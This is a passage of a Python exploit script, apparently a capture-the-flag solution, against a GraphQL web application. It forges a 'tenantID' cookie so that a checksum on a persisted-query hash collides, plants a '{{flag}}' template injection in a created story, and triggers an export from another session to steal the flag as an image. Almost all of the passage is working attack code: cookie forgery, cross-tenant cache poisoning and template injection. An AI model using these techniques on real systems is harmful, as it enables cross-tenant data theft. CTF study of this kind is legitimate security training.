    flag
    story(id: $id) {
        id
        text
        image {
            url
        }
    }
}
"""
query_hash = hashlib.sha256(query.encode()).hexdigest()
query_sum = sum([ord(c) for c in query_hash])
diff = (char_sum - query_sum + 5000) % 5000
new_tenantID = "z" * (diff // ord("z")) + chr(diff % ord("z"))

s2 = requests.session()
s2.cookies["tenantID"] = new_tenantID

assert char_sum == sum([ord(c) for c in query_hash + s2.cookies["tenantID"]])

r = s2.post(
    URL + "api/graphql",
    files={
        "operations": (
            None,
            '{"operationName":"UploadImage","variables":{"file":null},"query":"mutation UploadImage($file: Upload!) {\\n  uploadImage(file: $file)\\n}"}',
        ),
        "map": (None, '{"1":["variables.file"]}'),
        "1": ("favicon.png", open("k.png", "rb").read(), "image/png"),
    },
)
print(r.text)
image = r.json()["data"]["uploadImage"]

r = sendGraphql(
    """
mutation {
    createStory(story: { image: %d, text: "{{flag}}", action: "barbar"}) {
        id
        text
        action
    }
}
"""
    % image,
    s2,
)
print(r.text)
story_id = r.json()["data"]["createStory"]["id"]

r = sendGraphql(
    query,
    s2,
    variables={"id": story_id},
    extensions={"persistedQuery": {"version": 1, "sha256Hash": query_hash}},
)
print(r.text)

r = sendGraphql(
    """
mutation {
    createStoryExport(export: { storyId: %d,dimensions: SQUARE_400x400 }) {
        id
    }
}
"""
    % story_id,
    s1,
)
print(r.text)

time.sleep(30)
r = s1.get(URL + "api/export/" + str(r.json()["data"]["createStoryExport"]["id"]))
open("flag.png", "wb").write(r.content)
```